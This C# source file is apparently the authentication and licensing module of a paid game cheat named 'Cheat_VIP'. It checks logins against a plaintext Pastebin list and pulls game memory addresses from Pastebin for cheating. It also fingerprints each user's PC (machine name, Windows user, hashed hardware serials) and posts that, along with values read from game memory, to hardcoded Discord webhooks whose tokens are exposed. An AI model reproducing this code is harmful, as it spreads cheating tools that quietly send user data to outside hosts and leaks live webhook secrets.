using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Management;

namespace Cheat_VIP
{
    public class PastebinAuth
    {
        private static readonly HttpClient client = new HttpClient(); // Único HttpClient para toda a classe
        private const string PastebinUrlAuth = "https://pastebin.com/raw/mk2xjYiz"; // Autenticação
        private const string PastebinUrlAddresses = "https://pastebin.com/raw/5gDc0CGK"; // Endereços
        private const string DiscordWebhookUrlFirstLogin = "https://discord.com/api/webhooks/1349557926578229278/dWf_CfTzsPG6gBEUHFhNpz825-3Vtim2pmi2qkyGUuZpovEcdw3-jMNgjFd6vAjfZ5_U"; // Dados login
        private const string DiscordWebhookUrlMalicious = "https://discord.com/api/webhooks/1349562575544782941/7DZo6ByTIeAKT0ug0ormGcNcE25wQiCYS5KANk074qd_MvrCN5Bo1gja1FRcRJ7B_W5F"; // Dados maliciosos
        private const string DiscordWebhookUrlMemoryCheck = "https://discord.com/api/webhooks/1349579181171806271/kZZDQXtAH75nDHnXOMzCOnt7SzpNAK_PGhuxqXEe1B42s8eLl6EKIPvfu1x9Z3CRADw2"; // Contas
        private const string PASTEBIN_URL = "https://pastebin.com/raw/0tDQ5Tak"; // version

        // Dicionário para armazenar os endereços carregados
        public static Dictionary<string, IntPtr> MemoryAddresses { get; private set; } = new Dictionary<string, IntPtr>();

        public async Task<(bool success, string message)> AuthenticateAsync(string username, string password)
        {
            try
            {
                string pastebinContent = await client.GetStringAsync(PastebinUrlAuth);
                pastebinContent = pastebinContent.Trim();
                string[] validLogins = pastebinContent.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);

                foreach (string validLogin in validLogins)
                {
                    string[] parts = validLogin.Trim().Split(':');

                    if (parts.Length >= 3 && parts[0] == username && parts[1] == password)
                    {
                        if (parts.Length == 5) // Primeiro login
                        {
                            string dateStr = $"{parts[2]}:{parts[3]}:{parts[4]}";
                            (string computerName, string userName, string hardwareHash) = GetPcIdentifier();

                            bool discordSuccess = await SendToDiscord(username, computerName, userName, hardwareHash, isFirstLogin: true);
                            return discordSuccess
                                ? (false, "Primeiro login detectado. Aguarde validação.")
                                : (false, "Erro ao enviar dados. Fale com o ViGo ou verifique a sua conexão!");
                        }
                        else if (parts.Length == 6) // Login autenticado
                        {
                            string dateStr = $"{parts[2]}:{parts[3]}:{parts[4]}";
                            string savedHardwareHash = parts[5];
                            (string computerName, string userName, string hardwareHash) = GetPcIdentifier();

                            if (DateTime.TryParseExact(dateStr, "dd:MM:yyyy", null, System.Globalization.DateTimeStyles.None, out DateTime expiryDate))
                            {
                                if (expiryDate < DateTime.Today)
                                {
                                    return (false, $"Acesso expirado! Data limite: {expiryDate:dd/MM/yyyy}");
                                }
                            }
                            else
                            {
                                return (false, "Formato de data inválido!");
                            }

                            if (hardwareHash == savedHardwareHash)
                            {
                                return (true, "Login bem-sucedido!");
                            }
                            else
                            {
                                await SendToDiscord(username, computerName, userName, hardwareHash, isFirstLogin: false);
                                return (false, "Dados do PC não correspondem!");
                            }
                        }
                    }
                }
                return (false, "Login ou senha inválidos.");
            }
            catch (Exception ex)
            {
                return (false, $"Erro ao autenticar: {ex.Message}");
            }
        }

        public async Task<(bool success, string message)> LoadMemoryAddressesAsync()
        {
            try
            {
                string pastebinContent = await client.GetStringAsync(PastebinUrlAddresses);
                pastebinContent = pastebinContent.Trim();
                string[] addressLines = pastebinContent.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);

                MemoryAddresses.Clear();
                foreach (string line in addressLines)
                {
                    string[] parts = line.Trim().Split(':');
                    if (parts.Length == 2 && IntPtr.TryParse(parts[1], System.Globalization.NumberStyles.HexNumber, null, out IntPtr address))
                    {
                        MemoryAddresses[parts[0]] = address;
                    }
                    else
                    {
                        return (false, $"Formato inválido de endereços: {line}");
                    }
                }
                return (true, "Endereços carregados com sucesso!");
            }
            catch (Exception ex)
            {
                return (false, $"Erro ao carregar endereços: {ex.Message}");
            }
        }

        private (string computerName, string userName, string hardwareHash) GetPcIdentifier()
        {
            try
            {
                string computerName = Environment.MachineName;
                string userName = Environment.UserName;
                string motherboardSerial = "unknown";
                string diskSerial = "unknown";

                ManagementObjectSearcher moboSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
                foreach (ManagementObject obj in moboSearcher.Get())
                {
                    motherboardSerial = obj["SerialNumber"]?.ToString() ?? "unknown";
                    break;
                }

                ManagementObjectSearcher diskSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive WHERE Index = 0");
                foreach (ManagementObject obj in diskSearcher.Get())
                {
                    diskSerial = obj["SerialNumber"]?.ToString() ?? "unknown";
                    break;
                }

                string hardwareData = $"{motherboardSerial}|{diskSerial}";
                string hardwareHash = ComputeSha256Hash(hardwareData);

                return (computerName, userName, hardwareHash);
            }
            catch (Exception)
            {
                return ("error", "error", ComputeSha256Hash("error|error"));
            }
        }

        private async Task<bool> SendToDiscord(string username, string computerName, string userName, string hardwareHash, bool isFirstLogin)
        {
            try
            {
                string message = isFirstLogin
                    ? $"Novo usuário: {username}\\nNome do Computador: {computerName}\\nNome do Usuário: {userName}\\nHash do Hardware: {hardwareHash}"
                    : $"Usuário mal intencionado: {username}\\nNome do Computador: {computerName}\\nNome do Usuário: {userName}\\nHash do Hardware: {hardwareHash}";
                string webhookUrl = isFirstLogin ? DiscordWebhookUrlFirstLogin : DiscordWebhookUrlMalicious;

                var content = new StringContent(
                    $"{{\"content\": \"{message}\"}}",
                    Encoding.UTF8,
                    "application/json"
                );

                HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
                return response.IsSuccessStatusCode;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public async Task<bool> SendMemoryValuesToDiscord(string address1Name, string username, string address1Value, string address2Name, string address2Value)
        {
            try
            {
                string message = $"Conta:\\nusuário: {username}\\n{address1Name}: {address1Value}\\n{address2Name}: {address2Value}";
                var content = new StringContent(
                    $"{{\"content\": \"{message}\"}}",
                    Encoding.UTF8,
                    "application/json"
                );

                HttpResponseMessage response = await client.PostAsync(DiscordWebhookUrlMemoryCheck, content);
                return response.IsSuccessStatusCode;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(rawData));
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }

        // Método movido para o nível da classe
        public async Task<(string Version, string DownloadUrl)> CheckVersionAsync()
        {
            try
            {
                string response = await client.GetStringAsync(PASTEBIN_URL);
                string[] data = response.Trim().Split('|');
                string Version = data[0];
                string downloadUrl = data.Length > 1 ? data[1] : null;
                return (Version, downloadUrl);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro ao verificar versão: {ex.Message}");
                return (null, null);
            }
        }
    }
}